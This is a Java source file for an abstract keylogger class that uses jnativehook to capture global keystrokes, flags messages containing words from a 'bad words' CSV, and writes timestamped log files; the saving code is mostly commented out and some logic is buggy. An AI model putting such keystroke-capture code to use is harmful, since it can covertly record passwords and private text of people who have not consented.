package logger;

import environment.AccessWindow;
import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import view.AlertBox;

import java.io.*;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.Scanner;

public abstract class KeyLogger {

    private String badWordsFilePath = "/src/main/java/logger/BadWords.csv";
    String filePath = "/src/main/java/logger/logs/" + getCurrentTime() + ".csv";
    String warningFilePath = "/src/main/java/logger/logs/" + "WARNING!_" + getCurrentTime() + ".csv";

    String fileName = getCurrentTime() + ".csv";
    String warningFileName = "WARNING!_" + getCurrentTime() + ".csv";


    String message;
    String sendKey;

    AccessWindow accessWindow = new AccessWindow();

    abstract void nativeKeyPressed(NativeKeyEvent event);
    abstract public void turnOn();
    abstract void setDefaults();


    String getCurrentTime() {
        return new SimpleDateFormat("yyyy.MM.dd.HH.mm.ss").format(new Date());
    }


    void saveMessage() throws IOException {
        if(checkForBadWords(message)) {
//            File oldFile = new File(filePath);
//            filePath = warningFilePath;
//            fileName = warningFileName;
//            File newFile = new File(warningFilePath);
//            if(oldFile.renameTo(newFile)){
//                System.out.println("Rename succesful");
//            }else{
//                System.out.println("Rename failed");
//            }
        }
//        writeToFile(filePath);
    }


    public void turnOff()  {
        try {
            GlobalScreen.unregisterNativeHook();
        } catch (NativeHookException e) {
            e.printStackTrace();
        }
        try {
            saveMessage();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    private void writeToFile(String file) {
        try {
            BufferedWriter writer = new BufferedWriter(new FileWriter(file, true));
            writer.write(message);
            writer.newLine();
            writer.flush();
            writer.close();
            System.out.println(message);
            System.out.println("Message saved sucsessfully");
            setDefaults();
            writer.close();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    private boolean checkForBadWords(String message) {
        ArrayList<String> badWords = getBadWords();
        for (String badWord: badWords) {
            if(message.contains(badWord.toUpperCase())) {
                return true;
            }
        }
        return false;
    }

    private ArrayList<String> getBadWords () {
        ArrayList<String> badWords = new ArrayList<>();
        Scanner scanner = null;
        try {
            scanner = new Scanner(new File(badWordsFilePath));
        } catch (FileNotFoundException e) {
            e.printStackTrace();
        }
        if(scanner != null) {
            while (scanner.hasNext()) {
                AlertBox.display("ASD", scanner.nextLine());
                badWords.add(scanner.nextLine());
                System.out.println(scanner.nextLine());
            }
            scanner.close();
        }
        return badWords;
    }

    public String getFilePath() {
        return filePath;
    }

    public String getFileName() {
        return fileName;
    }

    public void nativeKeyReleased(NativeKeyEvent e) { }
    public void nativeKeyTyped(NativeKeyEvent e) { }
}
